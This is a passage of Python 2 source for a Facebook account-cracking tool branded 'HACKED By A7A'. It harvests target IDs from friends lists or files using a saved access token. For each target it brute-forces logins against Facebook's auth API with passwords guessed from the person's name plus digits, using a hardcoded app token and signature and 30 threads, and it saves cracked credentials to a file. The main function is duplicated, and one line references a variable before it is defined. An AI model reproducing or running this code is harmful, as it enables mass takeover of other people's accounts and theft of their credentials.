    print ' \x1b[1;31;40m\xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
    jalan(' \x1b[1;93mCloning Started  Wait...')
    print '\x1b[1;36;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'

    def main(arg):
        user = arg
        try:
            os.mkdir('output')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
                cek = open('output/cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '123123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
                    cek = open('output/cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
                        cek = open('output/cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass4)
                    else:
                        pass4 = b['first_name'] + '112233'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
                            cek = open('output/cp.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123321'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
                                cek = open('output/cp.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['first_name'] + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
                                    cek = open('output/cp.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = '112233445566'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
                                        cek = open('output/cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = '11221122'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass8 + ' >> ' + b['first_name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass8 + ' >> ' + b['first_name']
                                            cek = open('output/cp.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
    print '\x1b[1;32;40m[\xe2\x9a\xa1] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
    print '\x1b[1;34;40m[\xe2\x9a\xa1] CP File Has Been Saved : save/cp.txt'
    print logo4
    print '\n\t\t\x1b[1;33;40m\n\n\x1b[1;31;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1\n           '
    raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
    menu()


def buper():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;32;40m[1] \x1b[1;33;40mCrackrdne hawrekant'
    print '\x1b[1;32;40m[2] \x1b[1;33;40mCrackrdn ba ID'
    print '\x1b[1;32;40m[3] \x1b[1;33;40mhackrdn ba wordlist'
    print '\x1b[1;32;40m[4] \x1b[1;33;40mCrack File'
    print '\x1b[1;32;40m[0] \x1b[1;33;40mBack'
    pilih_buper()


def pilih_buper():
    peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;91m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_buper()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;93m[\xe2\x9a\xa1] Getting IDs \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;96m[\xe2\x9a\xa1] Enter ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;31;40m[\xe2\x9a\xa1] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;92m[\xe2\x9a\xa1] ID Not Found!'
                raw_input('\n\x1b[1;96m[\x1b[1;94mBack\x1b[1;96m]')
                buper()

            print '\x1b[1;35;40m[\xe2\x9a\xa1] Getting IDs...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            brute()
        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;96m[\xe2\x9a\xa1] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;35;40m[\xe2\x9a\xa1] \x1b[1;35;40mFile not found'
                raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
                buper()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_buper()
        print '\x1b[1;36;40m[\xe2\x9a\xa1] Total IDs : \x1b[1;94m' + str(len(id))
        jalan('\x1b[1;34;40m[\xe2\x9a\xa1] Please Wait\x1b[1;92m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32;40m[\xe2\x9a\xa1] Cloning\x1b[1;93m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m        \xe2\x9d\x88     \x1b[1;93mTo Stop Process Press CTRL+Z \x1b[1;94m    \xe2\x9d\x88'
    print ' \x1b[1;31;40m\xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'
    jalan(' \x1b[1;93mCloning Started  Wait...')
    print '\x1b[1;36;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1'

    def main(arg):
        user = arg
        try:
            os.mkdir('output')
        except OSError:
            pass

        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;94m|\x1b[1;92m ' + pass1 + ' >> ' + b['first_name']
                oks.append(user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' >> ' + b['first_name']
                cek = open('output/cp.txt', 'a')
                cek.write(user + '|' + pass1 + '\n')
                cek.close()
                cekpoint.append(user + pass1)
            else:
                pass2 = '123123'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' >> ' + b['first_name']
                    oks.append(user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass2 + ' >> ' + b['first_name']
                    cek = open('output/cp.txt', 'a')
                    cek.write(user + '|' + pass2 + '\n')
                    cek.close()
                    cekpoint.append(user + pass2)
                else:
                    pass3 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' >> ' + b['first_name']
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass3 + ' >> ' + b['first_name']
                        cek = open('output/cp.txt', 'a')
                        cek.write(user + '|' + pass3 + '\n')
                        cek.close()
                        cekpoint.append(user + pass4)
                    else:
                        pass4 = b['first_name'] + '112233'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' >> ' + b['first_name']
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass4 + ' >> ' + b['first_name']
                            cek = open('output/cp.txt', 'a')
                            cek.write(user + '|' + pass4 + '\n')
                            cek.close()
                            cekpoint.append(user + pass4)
                        else:
                            pass5 = b['last_name'] + '123321'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass5 + ' >> ' + b['first_name']
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' >> ' + b['first_name']
                                cek = open('output/cp.txt', 'a')
                                cek.write(user + '|' + pass5 + '\n')
                                cek.close()
                                cekpoint.append(user + pass5)
                            else:
                                pass6 = b['first_name'] + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass6 + ' >> ' + b['first_name']
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' >> ' + b['first_name']
                                    cek = open('output/cp.txt', 'a')
                                    cek.write(user + '|' + pass6 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    pass7 = '112233445566'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass7 + ' >> ' + b['first_name']
                                        oks.append(user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass7 + ' >> ' + b['first_name']
                                        cek = open('output/cp.txt', 'a')
                                        cek.write(user + '|' + pass7 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        pass8 = '11221122'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[HACKED By A7A] \x1b[1;92m ' + user + ' \x1b[1;36;40m | \x1b[1;92m ' + pass8 + ' >> ' + b['first_name']
                                            oks.append(user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user + ' \x1b[1;36;40m|\x1b[1;97m ' + pass8 + ' >> ' + b['first_name']
                                            cek = open('output/cp.txt', 'a')
                                            cek.write(user + '|' + pass8 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;31;40m[\xe2\x9c\x93] Process Has Been Completed\x1b[1;96m....'
    print '\x1b[1;32;40m[\xe2\x9a\xa1] Total OK/\x1b[1;93mCP \x1b[1;91m: \x1b[1;91m' + str(len(oks)) + '\x1b[1;31;40m/\x1b[1;36;40m' + str(len(cekpoint))
    print '\x1b[1;34;40m[\xe2\x9a\xa1] CP File Has Been Saved : save/cp.txt'
    print logo5
    print '\n\t\t\x1b[1;33;40m\n\n\x1b[1;31;40m \xe2\x9a\xa1\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x84\xe2\x96\xba\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f\xe2\x9a\xa1\n           '
    raw_input('\n\x1b[1;96m[\x1b[1;97mExit\x1b[1;96m]')
    menu()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;32;40m[1] \x1b[1;33;40mCrackrdne hawrekant'
    print '\x1b[1;32;40m[2] \x1b[1;33;40mCrackrdn ba ID'
    print '\x1b[1;32;40m[3] \x1b[1;33;40mhackrdn ba wordlist'
    print '\x1b[1;32;40m[4] \x1b[1;33;40mCrack File'
    print '\x1b[1;32;40m[0] \x1b[1;33;40mBack'
    pilih_super()


def pilih_super():
    peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;91m')
    if peak == '':
        print '\x1b[1;91mFill in correctly'
        pilih_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            jalan('\x1b[1;93m[\xe2\x9a\xa1] Getting IDs \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif peak == '2':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;96m[\xe2\x9a\xa1] Enter ID : ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;31;40m[\xe2\x9a\xa1] Name : ' + op['name']
            except KeyError:
                print '\x1b[1;92m[\xe2\x9a\xa1] ID Not Found!'
                raw_input('\n\x1b[1;96m[\x1b[1;94mBack\x1b[1;96m]')
                super()

            print '\x1b[1;35;40m[\xe2\x9a\xa1] Getting IDs...'
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif peak == '3':
            os.system('clear')
            print logo
            brute()
        elif peak == '4':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;96m[\xe2\x9a\xa1] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except IOError:
                print '\x1b[1;35;40m[\xe2\x9a\xa1] \x1b[1;35;40mFile not found'
                raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
                super()

        elif peak == '0':
            menu()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih_super()
        print '\x1b[1;36;40m[\xe2\x9a\xa1] Total IDs : \x1b[1;94m' + str(len(id))
        jalan('\x1b[1;34;40m[\xe2\x9a\xa1] Please Wait\x1b[1;92m...')
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;32;40m[\xe2\x9a\xa1] Cloning\x1b[1;93m' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m        \xe2\x9d\x88     \x1b[1;93mTo Stop Process Press CTRL+Z \x1b[1;94m    \xe2\x9d\x88'
